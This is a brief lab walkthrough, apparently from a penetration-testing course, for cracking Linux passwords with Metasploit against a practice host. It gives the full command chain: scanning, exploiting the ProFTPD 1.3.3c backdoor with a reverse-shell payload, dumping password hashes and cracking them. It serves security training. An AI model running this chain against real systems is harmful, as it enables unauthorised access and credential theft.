---
title: Linux Password Cracking
description: Notes on Linux Password Cracking.
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Linux
order: 87
---
## with metasploit

nmap -Pn -sS -sVC demo.ine.local

![](/notes/img/pasted-image-20251019122109.png)

```
nmap --script vuln -p 21 demo.ine.local
```

![](/notes/img/pasted-image-20251019122311.png)

```
search proftp backdoor
```

![](/notes/img/pasted-image-20251019122342.png)

```
use exploit/unix/ftp/proftpd_133c_backdoor
```

```
set payload payload/cmd/unix/reverse
```

![](/notes/img/pasted-image-20251019122618.png)

background

![](/notes/img/pasted-image-20251019122704.png)

```
use post/linux/gather/hashdump
```

```
set SESSION 1
```

![](/notes/img/pasted-image-20251019122733.png)

```bash
loot
```

![](/notes/img/pasted-image-20251019122754.png)

```
use auxiliary/analyze/crack_linux
```

```
set SHA512 true
```


![](/notes/img/pasted-image-20251019122854.png)

Cracked Password: password
